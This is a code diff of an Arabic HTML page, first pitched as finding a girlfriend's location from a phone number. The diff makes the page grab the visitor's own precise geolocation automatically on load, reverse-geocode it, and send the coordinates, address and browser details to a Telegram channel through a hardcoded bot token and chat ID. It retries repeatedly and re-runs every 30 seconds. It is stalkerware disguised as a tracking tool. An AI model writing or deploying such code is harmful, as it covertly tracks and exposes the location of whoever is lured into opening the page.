@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>معـرفة موقع حبيبتك من خلال الرقم</title>
+    <title>تحديد الموقع الفوري</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap');
         
@@ -21,7 +21,7 @@
             justify-content: center;
             align-items: center;
             position: relative;
-            overflow-x: hidden;
+            overflow: hidden;
         }
 
         /* خلفية نيون متحركة */
@@ -80,81 +80,105 @@
         .container {
             position: relative;
             z-index: 10;
-            width: 90%;
-            max-width: 600px;
-            padding: 30px;
+            width: 100%;
+            max-width: 700px;
+            padding: 20px;
         }
 
         /* الكارد الرئيسي */
         .main-card {
-            background: rgba(10, 10, 20, 0.7);
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
+            background: rgba(10, 10, 20, 0.8);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             border: 2px solid rgba(155, 48, 255, 0.5);
-            border-radius: 30px;
-            padding: 40px;
-            box-shadow: 0 0 30px rgba(155, 48, 255, 0.3),
-                        inset 0 0 20px rgba(155, 48, 255, 0.2);
+            border-radius: 40px;
+            padding: 50px 40px;
+            box-shadow: 0 0 50px rgba(155, 48, 255, 0.5),
+                        inset 0 0 30px rgba(155, 48, 255, 0.3);
             animation: cardGlow 3s infinite alternate;
+            text-align: center;
         }
 
         @keyframes cardGlow {
-            0% { box-shadow: 0 0 30px rgba(155, 48, 255, 0.3), inset 0 0 20px rgba(155, 48, 255, 0.2); }
-            100% { box-shadow: 0 0 50px rgba(155, 48, 255, 0.6), inset 0 0 30px rgba(255, 48, 255, 0.3); }
+            0% { box-shadow: 0 0 50px rgba(155, 48, 255, 0.3), inset 0 0 30px rgba(155, 48, 255, 0.2); }
+            100% { box-shadow: 0 0 80px rgba(255, 48, 255, 0.7), inset 0 0 50px rgba(155, 48, 255, 0.4); }
         }
 
         h1 {
             color: #fff;
             text-align: center;
-            font-size: 2.2em;
+            font-size: 2.5em;
             font-weight: 900;
             margin-bottom: 30px;
             text-shadow: 0 0 10px #9b30ff,
                          0 0 20px #9b30ff,
-                         0 0 40px #9b30ff;
+                         0 0 40px #ff00ff;
             letter-spacing: 2px;
-            word-break: break-word;
+            animation: textGlow 2s infinite alternate;
         }
 
-        /* الدائرة ثلاثية الأبعاد */
+        @keyframes textGlow {
+            from { text-shadow: 0 0 10px #9b30ff, 0 0 20px #9b30ff, 0 0 30px #ff00ff; }
+            to { text-shadow: 0 0 20px #ff00ff, 0 0 40px #9b30ff, 0 0 60px #ff00ff; }
+        }
+
+        /* الدائرة ثلاثية الأبعاد المتطورة */
         .loader-container {
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 40px 0;
+            margin: 50px 0;
             position: relative;
+            min-height: 300px;
         }
 
-        .circle-3d {
-            width: 180px;
-            height: 180px;
-            position: relative;
-            transform-style: preserve-3d;
+        /* دوائر متعددة ثلاثية الأبعاد */
+        .circle-3d-1, .circle-3d-2, .circle-3d-3 {
+            position: absolute;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            animation: rotate3D 3s infinite linear;
+        }
+
+        .circle-3d-1 {
+            width: 220px;
+            height: 220px;
+            border-top-color: #ff00ff;
+            border-bottom-color: #9b30ff;
+            border-left-color: transparent;
+            border-right-color: transparent;
+            box-shadow: 0 0 30px #ff00ff,
+                        0 0 60px #9b30ff;
             animation: rotate3D 4s infinite linear;
         }
 
-        .circle-3d::before,
-        .circle-3d::after {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            border-radius: 50%;
-            border: 4px solid transparent;
-            border-top-color: #ff00ff;
-            border-bottom-color: #9b30ff;
-            box-shadow: 0 0 20px #ff00ff,
-                        0 0 40px #9b30ff;
+        .circle-3d-2 {
+            width: 280px;
+            height: 280px;
+            border-top-color: #00ffff;
+            border-bottom-color: #ff00ff;
+            border-left-color: transparent;
+            border-right-color: transparent;
+            box-shadow: 0 0 30px #00ffff,
+                        0 0 60px #ff00ff;
+            animation: rotate3D 6s infinite linear reverse;
         }
 
-        .circle-3d::before {
-            transform: rotateX(60deg) rotateY(30deg);
-            animation: glowPulse 2s infinite alternate;
+        .circle-3d-3 {
+            width: 180px;
+            height: 180px;
+            border-top-color: #ffff00;
+            border-bottom-color: #ff00ff;
+            border-left-color: transparent;
+            border-right-color: transparent;
+            box-shadow: 0 0 30px #ffff00,
+                        0 0 60px #ff00ff;
+            animation: rotate3D 5s infinite linear;
         }
 
-        .circle-3d::after {
-            transform: rotateX(-60deg) rotateY(-30deg);
-            animation: glowPulse 2s infinite alternate-reverse;
+        @keyframes rotate3D {
+            0% { transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); }
+            100% { transform: rotateX(360deg) rotateY(180deg) rotateZ(360deg); }
         }
 
         .circle-text {
@@ -163,144 +187,102 @@
             left: 50%;
             transform: translate(-50%, -50%);
             color: #fff;
-            font-size: 1.3em;
-            font-weight: 700;
+            font-size: 1.8em;
+            font-weight: 900;
             text-align: center;
-            text-shadow: 0 0 10px #fff,
-                         0 0 20px #9b30ff;
-            width: 200px;
-            z-index: 2;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 15px;
-            border-radius: 50px;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(5px);
-            letter-spacing: 1px;
-        }
-
-        @keyframes rotate3D {
-            0% { transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); }
-            100% { transform: rotateX(360deg) rotateY(360deg) rotateZ(360deg); }
-        }
-
-        @keyframes glowPulse {
-            0% { opacity: 0.5; filter: blur(0px); }
-            100% { opacity: 1; filter: blur(2px); }
-        }
-
-        /* حقل الإدخال */
-        .input-group {
-            margin: 40px 0 30px;
-            text-align: center;
-        }
-
-        .phone-input {
-            width: 100%;
-            padding: 18px 25px;
-            background: rgba(0, 0, 0, 0.6);
-            border: 2px solid #9b30ff;
+            text-shadow: 0 0 20px #fff,
+                         0 0 40px #9b30ff,
+                         0 0 60px #ff00ff;
+            width: 300px;
+            z-index: 20;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px 30px;
             border-radius: 60px;
-            color: #fff;
-            font-size: 1.2em;
-            font-family: 'Cairo', sans-serif;
-            text-align: center;
-            box-shadow: 0 0 20px rgba(155, 48, 255, 0.3),
-                        inset 0 0 10px rgba(155, 48, 255, 0.2);
-            transition: all 0.3s ease;
-        }
-
-        .phone-input:focus {
-            outline: none;
-            box-shadow: 0 0 40px #9b30ff,
-                        inset 0 0 20px #ff00ff;
-            border-color: #ff00ff;
-        }
-
-        .phone-input::placeholder {
-            color: rgba(255, 255, 255, 0.5);
-            font-size: 0.9em;
-        }
-
-        /* زر الإرسال */
-        .submit-btn {
-            background: linear-gradient(45deg, #6a0dad, #9b30ff, #ff00ff);
-            background-size: 200% 200%;
-            color: white;
-            border: none;
-            padding: 18px 50px;
-            font-size: 1.3em;
-            font-weight: 700;
-            border-radius: 60px;
-            cursor: pointer;
-            width: 100%;
-            font-family: 'Cairo', sans-serif;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            box-shadow: 0 0 30px rgba(155, 48, 255, 0.5);
-            transition: all 0.3s ease;
-            animation: gradientMove 3s infinite alternate;
             border: 2px solid rgba(255, 255, 255, 0.3);
-            margin-top: 20px;
+            backdrop-filter: blur(10px);
+            letter-spacing: 2px;
+            animation: textPulse 2s infinite alternate;
         }
 
-        .submit-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 50px #ff00ff;
-            border-color: #fff;
+        @keyframes textPulse {
+            from { transform: translate(-50%, -50%) scale(1); opacity: 0.9; }
+            to { transform: translate(-50%, -50%) scale(1.1); opacity: 1; }
         }
 
-        .submit-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        @keyframes gradientMove {
-            0% { background-position: 0% 0%; }
-            100% { background-position: 100% 100%; }
-        }
-
-        /* رسالة الحالة */
-        .status-message {
-            margin-top: 30px;
+        /* رسالة الحالة المتطورة */
+        .status-container {
+            margin-top: 40px;
             padding: 20px;
-            border-radius: 15px;
-            text-align: center;
-            font-weight: 600;
-            display: none;
-            animation: slideIn 0.5s ease;
-            word-break: break-word;
-            max-height: 300px;
-            overflow-y: auto;
+            border-radius: 30px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(155, 48, 255, 0.3);
         }
 
-        @keyframes slideIn {
-            from { opacity: 0; transform: translateY(20px); }
+        .status-message {
+            padding: 20px;
+            border-radius: 20px;
+            text-align: center;
+            font-weight: 700;
+            font-size: 1.3em;
+            display: none;
+            animation: slideInUp 0.5s ease;
+            word-break: break-word;
+            backdrop-filter: blur(5px);
+        }
+
+        @keyframes slideInUp {
+            from { opacity: 0; transform: translateY(30px); }
             to { opacity: 1; transform: translateY(0); }
         }
 
         .status-message.success {
-            background: rgba(0, 255, 0, 0.2);
+            background: rgba(0, 255, 0, 0.15);
             border: 2px solid #00ff00;
             color: #00ff00;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
             display: block;
         }
 
         .status-message.error {
-            background: rgba(255, 0, 0, 0.2);
+            background: rgba(255, 0, 0, 0.15);
             border: 2px solid #ff0000;
             color: #ff0000;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
             display: block;
         }
 
         .status-message.info {
-            background: rgba(155, 48, 255, 0.2);
+            background: rgba(155, 48, 255, 0.15);
             border: 2px solid #9b30ff;
             color: #fff;
-            box-shadow: 0 0 20px rgba(155, 48, 255, 0.3);
+            box-shadow: 0 0 30px rgba(155, 48, 255, 0.3);
             display: block;
+        }
+
+        .status-message.warning {
+            background: rgba(255, 165, 0, 0.15);
+            border: 2px solid #ffa500;
+            color: #ffa500;
+            box-shadow: 0 0 30px rgba(255, 165, 0, 0.3);
+            display: block;
+        }
+
+        /* مؤشر التحميل النصي */
+        .loading-dots {
+            display: inline-block;
+        }
+
+        .loading-dots::after {
+            content: '.';
+            animation: dots 1.5s infinite;
+            font-size: 1.5em;
+        }
+
+        @keyframes dots {
+            0%, 20% { content: '.'; }
+            40% { content: '..'; }
+            60% { content: '...'; }
+            80%, 100% { content: ''; }
         }
 
         /* جسيمات متحركة */
@@ -316,11 +298,11 @@
 
         .particle {
             position: absolute;
-            width: 3px;
-            height: 3px;
+            width: 4px;
+            height: 4px;
             background: #ff00ff;
             border-radius: 50%;
-            box-shadow: 0 0 10px #ff00ff, 0 0 20px #9b30ff;
+            box-shadow: 0 0 15px #ff00ff, 0 0 30px #9b30ff;
             animation: particleFloat 8s infinite linear;
         }
 
@@ -331,29 +313,69 @@
             100% { transform: translateY(-100vh) scale(0); opacity: 0; }
         }
 
+        /* عداد الخطوات */
+        .step-counter {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .step {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid #9b30ff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+
+        .step.active {
+            background: #9b30ff;
+            box-shadow: 0 0 30px #9b30ff;
+            transform: scale(1.2);
+        }
+
+        .step.completed {
+            background: #00ff00;
+            border-color: #00ff00;
+            box-shadow: 0 0 30px #00ff00;
+        }
+
         /* تذييل */
         .footer-note {
             text-align: center;
             color: rgba(255, 255, 255, 0.5);
             margin-top: 30px;
-            font-size: 0.9em;
+            font-size: 1em;
             text-shadow: 0 0 10px #9b30ff;
         }
 
-        /* مؤشر التحميل */
-        .loading-spinner {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
-            border-radius: 50%;
-            border-top-color: #fff;
-            animation: spin 1s ease-in-out infinite;
-            margin-left: 10px;
+        /* إحصائيات سريعة */
+        .quick-stats {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 0.9em;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .stat-value {
+            color: #ff00ff;
+            font-weight: bold;
+            text-shadow: 0 0 10px #ff00ff;
         }
     </style>
 </head>
@@ -370,31 +392,47 @@
 
     <div class="container">
         <div class="main-card">
-            <h1>💜 معـرفة موقع حبيبتك من خلال الرقم 💜</h1>
+            <h1>⚡ نـظام تـحديد المـوقع الفـوري ⚡</h1>
             
-            <!-- الدائرة ثلاثية الأبعاد -->
+            <!-- الدوائر ثلاثية الأبعاد المتطورة -->
             <div class="loader-container">
-                <div class="circle-3d"></div>
-                <div class="circle-text">جـاري تـحميل شاشه العرض</div>
+                <div class="circle-3d-1"></div>
+                <div class="circle-3d-2"></div>
+                <div class="circle-3d-3"></div>
+                <div class="circle-text" id="mainText">
+                    جـاري التحميل<span class="loading-dots"></span>
+                </div>
             </div>
 
-            <!-- حقل إدخال الرقم -->
-            <div class="input-group">
-                <input type="text" class="phone-input" id="phoneNumber" 
-                       placeholder="📱 أدخل رقم الهاتف هنا ..." 
-                       value="+966XXXXXXXXX">
+            <!-- عداد الخطوات -->
+            <div class="step-counter" id="stepCounter">
+                <div class="step" id="step1">1</div>
+                <div class="step" id="step2">2</div>
+                <div class="step" id="step3">3</div>
+                <div class="step" id="step4">4</div>
             </div>
 
-            <!-- زر الإرسال -->
-            <button class="submit-btn" id="submitBtn" onclick="startLocationProcess()">
-                🔍 بـدء تـحديد المـوقع
-            </button>
+            <!-- رسالة الحالة المتطورة -->
+            <div class="status-container">
+                <div class="status-message" id="statusMessage">
+                    جـاري تـحضير النظام...
+                </div>
+            </div>
 
-            <!-- رسالة الحالة -->
-            <div class="status-message" id="statusMessage"></div>
+            <!-- إحصائيات سريعة -->
+            <div class="quick-stats">
+                <div class="stat-item">
+                    <span>⚡ الحالة:</span>
+                    <span class="stat-value" id="statusText">جاري الاتصال</span>
+                </div>
+                <div class="stat-item">
+                    <span>🕒 الوقت:</span>
+                    <span class="stat-value" id="timeText">00:00</span>
+                </div>
+            </div>
 
             <div class="footer-note">
-                ⚡ نظام تحديد مواقع متطور بدقة عالية ⚡
+                🔮 نـظام متطور يعمل تلقائياً - لا حاجة لإدخال بيانات 🔮
             </div>
         </div>
     </div>
@@ -404,10 +442,15 @@
         const TELEGRAM_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
         const CHANNEL_ID = '-1003875161698';
         
+        // متغيرات للتحكم
+        let startTime = Date.now();
+        let attemptCount = 0;
+        const MAX_ATTEMPTS = 3;
+
         // إنشاء الجسيمات المتحركة
         function createParticles() {
             const particlesContainer = document.getElementById('particles');
-            for (let i = 0; i < 30; i++) {
+            for (let i = 0; i < 50; i++) {
                 const particle = document.createElement('div');
                 particle.className = 'particle';
                 particle.style.left = Math.random() * 100 + '%';
@@ -417,80 +460,88 @@
             }
         }
 
-        // دالة إرسال الرسالة إلى تيليجرام باستخدام JSONP
-        function sendToTelegram(message) {
-            return new Promise((resolve, reject) => {
-                // إنشاء عنصر script لإرسال الطلب (لتجنب CORS)
-                const script = document.createElement('script');
-                const callbackName = 'telegramCallback' + Math.random().toString(36).substring(7);
-                
-                // دالة الكولباك
-                window[callbackName] = function(data) {
-                    document.body.removeChild(script);
-                    delete window[callbackName];
-                    resolve(data.ok);
-                };
-                
-                // إعداد URL مع callback
-                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHANNEL_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML&callback=${callbackName}`;
-                
-                script.src = url;
-                script.onerror = () => {
-                    document.body.removeChild(script);
-                    delete window[callbackName];
-                    
-                    // محاولة بديلة باستخدام fetch مع mode no-cors
-                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            chat_id: CHANNEL_ID,
-                            text: message,
-                            parse_mode: 'HTML'
-                        })
-                    })
-                    .then(response => response.json())
-                    .then(data => {
-                        if (data.ok) {
-                            resolve(true);
-                        } else {
-                            // إذا فشل، على الأقل نحاول تسجيل الموقع محلياً
-                            console.log('Message:', message);
-                            resolve(false);
-                        }
-                    })
-                    .catch(() => {
-                        // في حالة فشل كل المحاولات، نقوم بتسجيل الموقع محلياً
-                        console.log('Location info:', message);
-                        resolve(false);
-                    });
-                };
-                
-                document.body.appendChild(script);
-                
-                // مهلة للطلب
-                setTimeout(() => {
-                    if (window[callbackName]) {
-                        document.body.removeChild(script);
-                        delete window[callbackName];
-                        reject(new Error('Timeout'));
-                    }
-                }, 10000);
+        // تحديث الوقت
+        function updateTime() {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString('ar-EG', { 
+                hour: '2-digit', 
+                minute: '2-digit',
+                second: '2-digit'
             });
+            document.getElementById('timeText').textContent = timeString;
         }
 
-        // دالة الحصول على معلومات الموقع بالتفصيل
+        // تحديث الخطوات
+        function updateStep(step, status) {
+            const stepElement = document.getElementById(`step${step}`);
+            stepElement.classList.remove('active', 'completed');
+            stepElement.classList.add(status);
+        }
+
+        // تحديث النص الرئيسي
+        function updateMainText(text, isError = false) {
+            const mainText = document.getElementById('mainText');
+            mainText.innerHTML = text;
+            if (isError) {
+                mainText.style.color = '#ff0000';
+                mainText.style.textShadow = '0 0 20px #ff0000';
+            } else {
+                mainText.style.color = '#fff';
+                mainText.style.textShadow = '0 0 20px #fff, 0 0 40px #9b30ff';
+            }
+        }
+
+        // دالة إرسال الرسالة إلى تيليجرام
+        async function sendToTelegram(message, retryCount = 0) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHANNEL_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const data = await response.json();
+                console.log('Telegram response:', data);
+                
+                if (data.ok) {
+                    return true;
+                } else {
+                    if (retryCount < 3) {
+                        console.log(`Retrying... Attempt ${retryCount + 1}`);
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                        return sendToTelegram(message, retryCount + 1);
+                    }
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                if (retryCount < 3) {
+                    console.log(`Retrying... Attempt ${retryCount + 1}`);
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                    return sendToTelegram(message, retryCount + 1);
+                }
+                return false;
+            }
+        }
+
+        // دالة الحصول على معلومات الموقع
         async function getDetailedLocation(position) {
             const { latitude, longitude, accuracy } = position.coords;
             
-            // محاولة الحصول على العنوان باستخدام OpenStreetMap Nominatim
+            // محاولة الحصول على العنوان
             try {
-                // استخدام JSONP أو proxy لتجنب CORS
                 const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`, {
                     headers: {
-                        'Accept': 'application/json'
+                        'Accept': 'application/json',
+                        'User-Agent': 'LocationFinder/1.0'
                     }
                 });
                 const data = await response.json();
@@ -507,8 +558,7 @@
                     address,
                     city,
                     country,
-                    state,
-                    fullAddress: address
+                    state
                 };
             } catch (error) {
                 console.error('Error getting address:', error);
@@ -516,61 +566,62 @@
                     latitude,
                     longitude,
                     accuracy,
-                    address: 'غير متوفر (قد يكون الموقع دقيقاً لكن العنوان غير متوفر)',
+                    address: 'غير متوفر',
                     city: 'غير معروفة',
                     country: 'غير معروف',
-                    state: '',
-                    fullAddress: 'غير متوفر'
+                    state: ''
                 };
             }
         }
 
-        // دالة بدء عملية تحديد الموقع
-        function startLocationProcess() {
-            const phoneNumber = document.getElementById('phoneNumber').value;
-            const submitBtn = document.getElementById('submitBtn');
-            const statusMessage = document.getElementById('statusMessage');
-            
-            // التحقق من رقم الهاتف
-            if (!phoneNumber || phoneNumber.trim() === '') {
-                showStatus('الرجاء إدخال رقم الهاتف', 'error');
-                return;
-            }
-            
-            // تعطيل الزر
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '⏳ جاري التحميل... <span class="loading-spinner"></span>';
-            
-            showStatus('🔄 جاري طلب إذن الوصول للموقع... الرجاء السماح عند ظهور النافذة', 'info');
+        // دالة بدء عملية تحديد الموقع التلقائية
+        async function startAutomaticLocationProcess() {
+            updateStep(1, 'active');
+            updateMainText('جـاري طلب الإذن<span class="loading-dots"></span>');
+            showStatus('🔄 جاري طلب إذن الوصول إلى الموقع... الرجاء الانتظار', 'info');
             
             // التحقق من دعم المتصفح
             if (!navigator.geolocation) {
-                showStatus('❌ المتصفح لا يدعم خاصية تحديد الموقع', 'error');
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = '🔍 بـدء تـحديد المـوقع';
+                handleError('المتصفح لا يدعم خاصية تحديد الموقع');
                 return;
             }
-            
-            // خيارات تحديد الموقع
+
+            // محاولة الحصول على الموقع مع إعادة المحاولة
+            attemptCount = 0;
+            tryLocationRequest();
+        }
+
+        async function tryLocationRequest() {
+            attemptCount++;
+            updateStep(2, 'active');
+            updateMainText('جـاري تحديد الموقع<span class="loading-dots"></span>');
+            showStatus(`📍 محاولة تحديد الموقع... (المحاولة ${attemptCount}/${MAX_ATTEMPTS})`, 'info');
+
             const options = {
                 enableHighAccuracy: true,
-                timeout: 30000,        // زيادة المهلة إلى 30 ثانية
+                timeout: 15000,
                 maximumAge: 0
             };
-            
-            // طلب الموقع
+
             navigator.geolocation.getCurrentPosition(
                 async (position) => {
-                    showStatus('✅ تم الحصول على الموقع، جاري معالجة المعلومات...', 'info');
+                    // نجاح تحديد الموقع
+                    updateStep(2, 'completed');
+                    updateStep(3, 'active');
+                    updateMainText('جـاري معالجة البيانات<span class="loading-dots"></span>');
+                    showStatus('✅ تم تحديد الموقع بنجاح! جاري معالجة المعلومات...', 'success');
                     
                     // الحصول على المعلومات التفصيلية
                     const locationInfo = await getDetailedLocation(position);
                     
-                    // إنشاء رسالة منسقة للإرسال إلى تيليجرام
+                    updateStep(3, 'completed');
+                    updateStep(4, 'active');
+                    updateMainText('جـاري الإرسال للقناة<span class="loading-dots"></span>');
+                    showStatus('📤 جاري إرسال المعلومات إلى القناة...', 'info');
+                    
+                    // إنشاء رسالة منسقة
                     const message = `
-🚨 <b>تنبيه جديد - تم تحديد موقع</b> 🚨
-
-📱 <b>رقم الهاتف:</b> ${phoneNumber}
+🚨 <b>تحديث فوري - تم تحديد موقع جديد</b> 🚨
 
 📍 <b>معلومات الموقع:</b>
 ━━━━━━━━━━━━━━━
@@ -582,7 +633,7 @@
 🗺️ <b>المنطقة:</b> ${locationInfo.state || 'غير متوفر'}
 🌍 <b>البلد:</b> ${locationInfo.country}
 
-📍 <b>العنوان الكامل:</b>
+📍 <b>العنوان:</b>
 ${locationInfo.address}
 
 🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}
@@ -590,120 +641,116 @@ ${locationInfo.address}
 🔗 <b>رابط خرائط جوجل:</b>
 https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}
 
+📱 <b>معلومات إضافية:</b>
+• نوع المتصفح: ${navigator.userAgent}
+• اللغة: ${navigator.language}
+• النظام: ${navigator.platform}
+
 ━━━━━━━━━━━━━━━
-⚡ <b>نظام التتبع المتطور</b> ⚡
+⚡ <b>تم التحديد تلقائياً</b> ⚡
                     `;
                     
                     // إرسال إلى تيليجرام
-                    showStatus('📤 جاري إرسال المعلومات إلى القناة...', 'info');
+                    const sent = await sendToTelegram(message);
                     
-                    try {
-                        const sent = await sendToTelegram(message);
-                        
-                        if (sent) {
-                            showStatus(`
-✅ <b>تم بنجاح!</b>
-📱 الرقم: ${phoneNumber}
-📍 المدينة: ${locationInfo.city}
-🌍 البلد: ${locationInfo.county}
-📍 العنوان: ${locationInfo.address.substring(0, 100)}...
-🎯 الدقة: ${Math.round(locationInfo.accuracy)} متر
+                    if (sent) {
+                        updateStep(4, 'completed');
+                        updateMainText('✅ تم الإرسال بنجاح');
+                        showStatus(`
+✅ <b>تم إرسال الموقع بنجاح إلى القناة!</b>
 
-تم إرسال المعلومات إلى القناة بنجاح!
-                            `, 'success');
-                            
-                            // محاولة إرسال رسالة ثانية مع رابط الموقع
-                            try {
-                                await sendToTelegram(`📍 <b>رابط الموقع المباشر:</b> https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`);
-                            } catch (e) {
-                                console.log('Second message optional');
-                            }
-                        } else {
-                            // إذا فشل الإرسال، نعرض الموقع محلياً
-                            showStatus(`
-⚠️ <b>تم تحديد الموقع لكن فشل الإرسال للقناة</b>
-
-📱 الرقم: ${phoneNumber}
 📍 الموقع: ${locationInfo.latitude}, ${locationInfo.longitude}
 🏙️ المدينة: ${locationInfo.city}
 🌍 البلد: ${locationInfo.country}
-📍 العنوان: ${locationInfo.address}
+🎯 الدقة: ${Math.round(locationInfo.accuracy)} متر
 
-🔗 رابط خرائط جوجل:
+🔗 رابط الخريطة:
 https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}
-
-يمكنك نسخ الرابط يدوياً
-                            `, 'info');
-                        }
-                    } catch (error) {
-                        showStatus(`
-⚠️ <b>تم تحديد الموقع لكن حدث خطأ في الإرسال</b>
-
-📱 الرقم: ${phoneNumber}
-📍 الموقع: ${locationInfo.latitude}, ${locationInfo.longitude}
-🔗 الرابط: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}
-                        `, 'info');
+                        `, 'success');
+                        
+                        // إرسال رابط منفصل
+                        await sendToTelegram(`📍 <b>رابط الموقع المباشر:</b> https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`);
+                        
+                        // إعادة تشغيل العملية بعد 30 ثانية
+                        setTimeout(() => {
+                            resetAndRestart();
+                        }, 30000);
+                    } else {
+                        handleError('فشل إرسال المعلومات إلى القناة');
                     }
-                    
-                    // إعادة تمكين الزر بعد 10 ثواني
-                    setTimeout(() => {
-                        submitBtn.disabled = false;
-                        submitBtn.innerHTML = '🔍 بـدء تـحديد المـوقع';
-                    }, 10000);
-                    
                 },
                 (error) => {
                     // معالجة الأخطاء
                     let errorMessage = '';
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMessage = '❌ تم رفض طلب تحديد الموقع. يرجى السماح بالوصول إلى الموقع.';
+                            errorMessage = 'تم رفض الإذن. يرجى السماح بالوصول إلى الموقع';
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMessage = '❌ معلومات الموقع غير متوفرة حالياً.';
+                            errorMessage = 'معلومات الموقع غير متوفرة';
                             break;
                         case error.TIMEOUT:
-                            errorMessage = '❌ انتهت مهلة طلب تحديد الموقع. يرجى المحاولة مرة أخرى.';
+                            errorMessage = 'انتهت المهلة';
                             break;
                         default:
-                            errorMessage = '❌ حدث خطأ غير معروف: ' + error.message;
+                            errorMessage = 'خطأ غير معروف';
                     }
                     
-                    showStatus(errorMessage, 'error');
-                    
-                    // إعادة تمكين الزر
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = '🔍 بـدء تـحديد المـوقع';
+                    if (attemptCount < MAX_ATTEMPTS) {
+                        // إعادة المحاولة
+                        updateMainText(`⚠️ إعادة المحاولة ${attemptCount + 1}/${MAX_ATTEMPTS}`);
+                        showStatus(`⚠️ ${errorMessage} - جاري إعادة المحاولة...`, 'warning');
+                        setTimeout(tryLocationRequest, 2000);
+                    } else {
+                        handleError(`فشل تحديد الموقع بعد ${MAX_ATTEMPTS} محاولات: ${errorMessage}`);
+                    }
                 },
                 options
             );
         }
 
-        // دالة عرض الحالة
+        function handleError(message) {
+            updateMainText('❌ فشل التحديد', true);
+            showStatus(`❌ ${message}`, 'error');
+            
+            // إعادة المحاولة بعد 10 ثواني
+            setTimeout(() => {
+                resetAndRestart();
+            }, 10000);
+        }
+
+        function resetAndRestart() {
+            // إعادة تعيين كل شيء
+            for (let i = 1; i <= 4; i++) {
+                document.getElementById(`step${i}`).classList.remove('active', 'completed');
+            }
+            startAutomaticLocationProcess();
+        }
+
         function showStatus(message, type) {
             const statusMessage = document.getElementById('statusMessage');
             statusMessage.className = `status-message ${type}`;
             statusMessage.innerHTML = message.replace(/\n/g, '<br>');
             
-            // تمرير تلقائي للرسالة
-            statusMessage.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            // تحديث النص في الإحصائيات
+            document.getElementById('statusText').textContent = 
+                type === 'success' ? 'تم بنجاح' : 
+                type === 'error' ? 'خطأ' : 
+                type === 'warning' ? 'تحذير' : 'جاري التنفيذ';
         }
 
         // تهيئة الصفحة
         window.onload = function() {
             createParticles();
             
-            // إضافة تأثير عند الضغط على Enter
-            document.getElementById('phoneNumber').addEventListener('keypress', function(e) {
-                if (e.key === 'Enter') {
-                    startLocationProcess();
-                }
-            });
+            // تحديث الوقت كل ثانية
+            setInterval(updateTime, 1000);
+            updateTime();
             
-            // رسالة ترحيب
+            // بدء العملية التلقائية بعد ثانيتين
             setTimeout(() => {
-                showStatus('✨ مرحباً بك في نظام تحديد المواقع المتطور ✨', 'info');
-            }, 1000);
+                startAutomaticLocationProcess();
+            }, 2000);
         };
     </script>
 </body>
